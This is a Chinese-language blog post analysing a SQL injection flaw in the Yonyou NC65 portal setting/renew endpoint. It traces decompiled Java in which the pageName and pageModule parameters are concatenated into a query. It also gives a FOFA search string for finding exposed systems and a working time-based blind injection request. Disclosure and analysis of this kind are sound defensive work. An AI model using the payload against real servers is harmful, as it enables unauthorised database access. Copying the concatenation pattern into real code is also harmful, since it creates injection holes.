---
title: "用友NC setting/renew sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-setting-renew-pageName-pageModule-sqli.html
asset_dir: assets/用友nc-settingrenew-sql注入漏洞
---

# 用友NC setting/renew sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/10 08:28
- 818浏览
- [0评论](#comment)
- 1小时阅读

深入探索

漏洞预警服务

技术文章订阅

网络安全会议

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/setting/renew接口中的 pageName 和 pageModule 参数实现sql注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")，从而窃取服务器的敏感信息。

代码安全审计

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据官方漏洞通告可知 renew 为sql注入点，参数为 pageName

[![用友NC setting/renew sql注入漏洞](images/img-001-1865266d0b15.webp)](https://image.mrxn.net/86a0954d031a41da83d8b2606de73c87.webp)

因此搜索 renew 方法定义即可找到如下文件  
nc/uap/portal/action/PortalSettingAction.class

漏洞修复方案

```
package nc.uap.portal.action;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.http.Cookie;
import nc.uap.cpb.org.exception.CpbBusinessException;
import nc.uap.cpb.org.util.CpbServiceFacility;
import nc.uap.cpb.org.vos.CpUserVO;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Param;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.comm.setting.PtSettingVO;
import nc.uap.portal.comm.setting.itf.IPortalSetting;
import nc.uap.portal.deploy.vo.PtSessionBean;
import nc.uap.portal.exception.PortalServiceException;
import nc.uap.portal.exception.UserAccessException;
import nc.uap.portal.log.PortalLogger;
import nc.uap.portal.om.Page;
import nc.uap.portal.om.PortletDisplay;
import nc.uap.portal.om.Skin;
import nc.uap.portal.plugins.PluginManager;
import nc.uap.portal.portlet.AddPortletHelper;
import nc.uap.portal.service.PortalServiceUtil;
import nc.uap.portal.util.PortalPageDataWrap;
import nc.uap.portal.util.ToolKit;
import nc.uap.portal.util.freemarker.FreeMarkerTools;
import nc.uap.portal.vo.PtPageVO;
import nc.uap.portal.vo.PtThemeVO;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.lang.StringUtils;

@Servlet(
    path = "/setting"
)
public class PortalSettingAction extends BaseAction {
    public PortalSettingAction() {
    }

@Action
public void renew(@Param(name = "pageName") String pageName, @Param(name = "pageModule") String pageModule) {
    PtSessionBean sbean = (PtSessionBean)LfwRuntimeEnvironment.getLfwSessionBean();
    String userid = sbean.getPk_user();
    if (StringUtils.isBlank(userid)) {
        throw new IllegalArgumentException(NCLangRes4VoTransl.getNCLangRes().getStrByID("pserver", "PortalSettingAction-000007"));
    } else {
        try {
            StringBuffer where = new StringBuffer(" pagename='");
            where.append(pageName).append("' and module='").append(pageModule);
            where.append("' and fk_pageuser='").append(userid).append("'");
            PtPageVO[] pages = PortalServiceUtil.getPageQryService().getPagesByCondition(where.toString());
            if (pages != null && pages.length > 0) {
                PortalServiceUtil.getPageService().delete(pages[0].getPk_portalpage());
                this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pserver", "PortalSettingAction-000008"));
                return;
            }
        } catch (Exception e) {
            PortalLogger.error(e.getMessage(), e);
        }

        this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pserver", "PortalSettingAction-000009"));
    }
}
```

pageName 和 pageModule 直接拼接进 getPagesByCondition 语句中，其实现逻辑如下

代码安全审计

```
public PtPageVO[] getPagesByCondition(String condition) throws PortalServiceException {
        PtBaseDAO dao = new PtBaseDAO();

        try {
            List<PtPageVO> vos = (List)dao.retrieveByClause(PtPageVO.class, condition);
            if (vos != null && vos.size() > 0) {
                return (PtPageVO[])vos.toArray(new PtPageVO[0]);
            }
        } catch (DAOException e) {
            PortalLogger.error(e.getMessage(), e);
        }

        return null;
    }
```

将 where 语句即 condition 又代入 dao.retrieveByClause 中，其实现逻辑如下

搜索引擎

```
public Collection retrieveByClause(Class className, String condition) throws DAOException {
    PersistenceManager manager = null;
    Collection values = null;

    try {
        manager = this.createPersistenceManager(this.dataSource);
        values = manager.retrieveByClause(className, condition);
    } catch (DbException e) {
        Logger.error(e.getMessage(), e);
        throw new DAOException(e.getMessage());
    } finally {
        if (manager != null) {
            manager.release();
        }

    }

    return values;
}
```

将 condition 代入 createPersistenceManager.retrieveByClause 中，其实现逻辑如下

```
public Collection retrieveByClause(Class className, String condition, String[] fields, SQLParameter parameters) throws DbException {
        BaseProcessor processor = new BeanListProcessor(className);
        return (Collection)this.session.executeQuery(this.buildSql(className, condition, fields), parameters, processor);
    }
```

通过 buildSql 组合 where 语句 其代码实现逻辑如下

```
    private String buildSql(Class className, String condition, String[] fields) {
        SuperVO vo = (SuperVO)this.InitClass(className);
        String pkName = vo.getPKFieldName();
        boolean hasPKField = false;
        StringBuffer buffer = new StringBuffer();
        String tableName = vo.getTableName();
        if (fields == null) {
            buffer.append("SELECT * FROM ").append(tableName);
        } else {
            buffer.append("SELECT ");

            for(int i = 0; i < fields.length; ++i) {
                if (fields[i] != null) {
                    buffer.append(fields[i]).append(",");
                    if (fields[i].equalsIgnoreCase(pkName)) {
                        hasPKField = true;
                    }
                }
            }

            if (!hasPKField) {
                buffer.append(pkName).append(",");
            }

            buffer.setLength(buffer.length() - 1);
            buffer.append(" FROM ").append(tableName);
        }

        if (condition != null && condition.length() != 0) {
            if (condition.toUpperCase().trim().startsWith("ORDER ")) {
                buffer.append(" ").append(condition);
            } else {
                buffer.append(" WHERE ").append(condition);
            }
        }

        return buffer.toString();
    }
```

最终直接调用 session.executeQuery 执行上面组合后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

可先通过 list 或 templateList 接口来确定目标是否存在此应用

编程

```
GET /portal/pt/setting/templateList?pageId=login HTTP/1.0
Host: nc65.mrxn.net
```

[![用友NC setting/renew sql注入漏洞](images/img-002-b2ee3e95070f.webp)](https://image.mrxn.net/7ed8f68e73a84978b190961a65bf25cd.webp)

```
GET /portal/pt/setting/templateList?pageId=login HTTP/1.0
Host: nc65.mrxn.net
```

因存在 `LfwRuntimeEnvironment.getLfwSessionBean()` 漏洞利用需要登录权限

漏洞修复方案

```
GET /portal/pt/setting/renew?pageId=login&pageName=1'waitfor+delay+'0:0:2'--&pageModule=1'waitfor+delay+'0:0:2'-- HTTP/1.0
Host: nc65.mrxn.net
Cookie: JSESSIONID=xxxx
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=541`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALj0lEQVR4Aeyc4XrbuA5Ec/r+79xdeHpkESItJ2lj/1C+ix3OYAAyhHRTN/vtr4+Pj99fid9/vnrtH3nrueLqon3OuD5R/x577lmur+O+92yt35z8K1gD+b/u+t+73MA2kP+n+/FMrA5uLfABHGw9D9x8ELQARq5u/YqXDqnVC+GVq4A511+eCrkIqYM5Vs0srD/Dfe02kL14rV93A4eBwNeeAkid34pPhRzGvLrY/Z3DWA8jt88M7SXqkcPjXvo62ucMIf1hxFndYSAz06X93A18eyCQqXtknyKY690nF62Xw7xP9+mfIcx7QPTeC6LPes20Xj/zPKt9eyDPbnT5nruBvz4QyNPlUwPhEPRYEL7ywZg/8wG23v70Zo0J4JaTizDqvU5fx2d9ve4R/+sDebTZlTu/gcNAnHrH81Zx3Op+1wf18LN/Qp5O60TrIHkIquuboR6Y18BcX9WpizDWq69wdsbSZv7DQGamS/u5G9gGApk6PMbV0WriFZD67qtchXqtK+QipL5yFeq1rpCLED+gtGH5KzahLSpXAdx+ttS6otluOaDLGwdunk34s4Do8Bj/2G+wDeTGrn+8/AZ+1RPxlfDk1kKeAnUIX+X1dex+effJzReqrRByJvPwHK/eFdbVukLesXJfjesN6bf5Yr4cCIxPj+eEud6fCP3iWV6fqB/m+0F0OKI9OtpTNN/5SofsZR7CV/WQPIzY6+GeXw7Eogt/9gYOA4FMa3UMnwYYfRAOwVU9JA/B7oPHuvs/g5Beet0LoneuT4T4IKhuXecQ3yqv/ggPA3lkvnL//gZ+wTjV1ZYQHwS7rz8tcogfguqifWDMq4u/f/++/UZTDvHLZ9j36B7zonkYe5uHUYdwCOqzT8ezfPmvN6Ru4Y1iGwhkyp5tNU11EcY662Gur/L2M98R0g+C+iEc6CUbB26fpCHYazdjW3TfinfdNjDup97R+sJtIN108dfcwGEgNaUKyHQh6PFg5Gd69doHjPXmeh8Yfeb1Q/LyQoimt2N5KmD0QTgEe91nOaRP7VUB4as+kDzwcRjIx/X10hs4DAQyrZpsRT9daRUQn/nSZmEe4tej3rHnO9e/0isP2QuCeiG8PBXqHSu3D/OQ+s5h1Ht+3+tsfRjIWcGV/7c3sA3EqZ5tB997GiD1q30g+X6ezmf1esSZpzTzkL1gRPPlrYDka10B4fpEiA5BdbFqz2IbyJnxyv/MDWy/D3G71TTVRchTYN2zaH33Q/qd5SE+CPY+e957ySG1N/7g9/8Q375nra2D5CGoXp4KiA7B0vahf4/XG7K/oTdYb3+XBZkiBD2b04PoEFTXJ0Lyna/8+sxD6mFE8x2tL4SxprR9QPJqMHL1Fbo3pE4uQnTr1eUixAdHvN4Qb+lNcBtInyaM0/O83afeEVLf/fBYt491IqQORtS/R2v2Wq3VV1iefehTg+wtF2HUe50cHvuq3zaQIle8/gYOA3GaHT0qZMowovnPIqSPde4L0SGork+E5AGlDYHb3/Juwp8FRIfgH3kDiA7B1d4WmBfVIfXys3z5DgMp8YrX3cDpQCBTdrpiP7K6aB5SL+95dREe+x/Vm4P06Nw91OUQv/wsr68jjH3Mw1w3v8fTgezN1/rf38D2SR0yRQi69bNPC6QOgtaJ9hMhPvnKZx7ih6C6dYWQXK0rugeSh2DPV00FJF/rCn3PIjD87KoeFTD2La3H9YY8e8s/5FsOBDJNzwHhTlRdLqpD/DBHfb1OXYTUyx/5ew5SC0F7nGHvc8btp09UF7sOORfccTkQm1z4szewDaRPz2NApnfGIT77iNatEFLX89aL5mH0Qzgc0ZozhNTqg5Grd4T4YI76Ycyrz3AbyCx5aT9/A4eB+ESKHkne0fwZ9jq5dZCnaMW7Xz5De5iTfxVhPJt9en95x5VffY+HgeyT1/rnb2AbCIxPAYzco8Fc96nQt0IY660TretcvSOkH9BTt88CwO3fCbbfHi1Q6xy49ei6HMb8Z3X33eM2EJtd+NobuAby2vs/7L79CtcM5DWs16hCXSytQt4RUg9B8xBetRUQDkF9lauA6BA037G8Rs/JIT0gqG4djDqEmxetE7+rQ/aBO15viLf7Jrj95aLTFiFT85wQDiOa72gf9c67DmNf/SIkbx2EwxH1rBDGGn0QfbVn98lFSD2MuMqr7/F6Q/a38Qbrw8+QszP59Jz5zOuHx0+NPutESF3Py2do7Qqt6fmuyyFn0K8uF7su/wxeb4i3+Sa4DQQePwVOGeKT+31AdHlH/R2774xbrw+yL9xRj6j3jMO9B9zX1sNdA5S3D54K7gMMHyzNw1yv/DaQIle8/ga2gfSpwjhFCO8+uXj2LUH6QLD7e5/OIXUQ7PV7DqMHwmHEfU2t+55ysTwVkD613gdE1w/he0+tITrccRtIGa54/Q1sn0MgU/JITrdziM88hENQ3ToRkv/4UBkRkoegWRh57y/fI4w19hL1dt518yKkrz4RokNQ/wqtm+WvN2R2Ky/Ulp9DINPu05RD8p696zDP619h76MPxn5dB5Q2tJdC5+orfNavT7QfcPtT1pluvvB6Q7y9N8FtIDWdffTzQaYNwb231hDdutIq5B0rNwtIn1muNEjefqUZMOb0dIT4rDMP0WGO3SfvaF8R0k+funyP20D24rV+3Q0cBgLjNCHcqYoQHYJ+Cz2vDqMPwmFE63sdxGde1FfYNRhrylPRfaVVqD+LVfNM2A9yHmsgHO54GIjmC19zA9vnkL69UxXhPkU4/xcHer8Vt795yD7yVR7igyP2WohHXYToEOx65zD6VnmY+/Q/wusNeXQ7L8htn0MgU/WJhHAIeraeV4fHPus6Quq6ftbXvHWFXYOxt3mILq/aCohe6wrzYmkVEJ/6GUL8VVuhv9YV8sLrDalbeKM4/RniWWuSFZBpq0N45Sq6LhchfgiqizDXn8nX/hUw9oBwCJan4qwnxH/mq14V+mpdAamvdYX5R3i9IY9u5wW57WeIe0OmCkF1sSa9D3WIH4J7T631iaVVyMXSKiB9ul65CnWID+5ornz7UO+499Qa0ktfaRUrDvGXp0JfR4iv63t+vSH723iD9eFnSE14FpDpQrCf3ZquyyF1+mDOIbp1IkSHoPoM3cMcpKbrncPo63k5xGd/dTmMeXV9MM+X73pD6hbeKA4DgUwPgp7V6Ypdh/h7HqLr/y7aX9z3m2mVX+mQs0FQH4RDsHp8JezXa1d6+Q4DKfGK193A4U9ZHmU1RRifGgjvfnisu4/Y61cc0heC1hdCNBixchUQvdbPRVyQOgj2s0F0CKbq4/bbQogGa7Rf4fWGfLzX1/anrJrOPlbH1NPzkCdAXR9El3eE5M/qYO7r/Yrba4WQXuWtWPnUy7MP9Y57z36tb6/t15DzANd/avzjzb62nyFwnxKcr/0+nLRchPSQd4Tkez1E7/4Vh/iBg8XewO3/zzWsdPMdYayHcAie+Vd5ONZfP0P6bb2YbwPxqTnD1Xmt6/muQ56KlW69eYhfvaO+wp7rvDwVXe+8PBVdh8dn0V+1FfLP4DaQzxRd3n93A4eBQJ4CGPHsCBB/90F0CNaTUwHhELSuchUw1/VB8nDE7ukcUqNe+1XIxdIq5B0rV6EO6Qsj9nzVrOIwEIsvfM0NfHsgkKfBiUO43466XOx65/o66hP3ebUV6u15dRjPDuHdL4d53n4drVOH1MsLvz2QanLF37uBbw/EqUOmLRf7USG+lQ5j/qyP+cJne3afvHpUwHgGCIdg98vhcV5fR0gdcH1S/3izr8MbUk/ILM7ObQ1k2md+iM86/XJRHeKXP4O9R6+BsSeMvPt7P5j79UHyndtXfY+HgWi+8DU3sA0EMk14jGfHdNow9rHOvFxUh9SpfwbhuVoYfTDy1Z7w2Of3sKrveUg/uOM2kFWTS//ZG7gG8rP3fbrbfwAAAP//5hqnIAAAAAZJREFUAwAMBuO8T7337AAAAABJRU5ErkJggg==)

手机扫码阅读
